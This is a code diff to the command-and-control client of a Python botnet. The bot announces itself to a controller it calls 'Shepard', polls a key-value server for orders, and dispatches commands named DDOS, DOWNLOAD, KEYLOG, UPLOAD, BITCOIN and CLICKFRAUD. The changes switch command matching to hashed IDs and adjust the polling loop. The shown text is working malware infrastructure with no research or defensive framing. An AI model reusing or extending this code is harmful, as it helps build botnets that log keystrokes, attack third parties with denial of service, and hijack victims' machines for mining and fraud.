@@ -60,13 +60,16 @@ Block the command from being run again.
 Return to wait_cmd() loop and check for new commands
 """
 async def get_cmd(value, server, bot):
-    commands = ['DDOS', 'DOWNLOAD', 'KEYLOG', 'UPLOAD', 'BITCOIN', 'CLICKFRAUD']
+    print("\nCommand to run is {}\n".format(value))
+    #The bot needs to check the recived command ID (hashed) from the commander, then sets its value to true and performs the works
+    hashCommands = [get_hash(command) for command in bot.cmdsrun.keys()]
+    print("Hashes of the command dict is {}".format(hashCommands))
     try:
         x = value.split()
         cnt = int(x[0])  # parse out the command count
-        cmd = x[1]
+        cmd = x[1]  
         print("\nCMD TO RUN {}\n".format(cmd))
-        if cmd in commands and cnt > bot.cmdcnt:
+        if cmd in hashCommands and cnt > bot.cmdcnt:
             bot.cmdcnt += 1
             if cmd == 'KEYLOG':
                 if bot.cmdsrun['KEYLOG'] is False:
@@ -122,6 +125,9 @@ async def wait_cmd(server, bot):
         checkCommands = await server.get(bot.cmdkey)
         await asyncio.sleep(5)
         numcalls+=1
+        #When the command is received get will return True and break out of the loop
+        if checkCommands:
+            break
     print("\nFound a command for nodeID {}\n\n".format(checkCommands))
     await asyncio.sleep(5)
     await get_cmd(checkCommands,server,bot)
@@ -131,6 +137,7 @@ callhome -> Checks to see if a node has already joined the network
 If node is not apart of network then join [set()] with the Network Key and ID value of bot
 otherwise wait for commands: wait_cmd()
 """
+#TODO: Fix the loop that call home creates, calling recusivly either callhome() or wait_cmd() until program runs out of memory
 async def callhome(server, bot):
     ##NOTE KEY initialized at start of loop, no need to create here
     # announce to Shepard that we exist, then check for ack
@@ -139,6 +146,7 @@ async def callhome(server, bot):
         print("No ack for {}".format(nodeId))
         await server.set(NETKEY, str(bot.id))
         await asyncio.sleep(5)
+        
         await callhome(server,bot)
     else:    
         print("\nWe have an ack\nNode: {} has joined {}\n\n"
